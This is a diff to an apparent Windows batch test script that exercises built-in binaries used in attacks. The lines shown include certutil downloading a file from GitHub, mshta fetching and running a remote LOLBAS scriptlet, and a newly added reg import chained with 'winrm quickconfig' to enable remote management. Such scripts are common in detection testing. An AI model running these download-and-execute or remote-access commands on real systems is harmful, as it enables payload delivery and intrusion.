@@ -244,6 +244,8 @@ certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/
 ECHO ============================
 mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
 ECHO ============================
+reg.exe import c:\path\to\Slmgr.reg & winrm quickconfig
+ECHO ============================
 dir /s
 ECHO ============================
 takeown /F test.bat
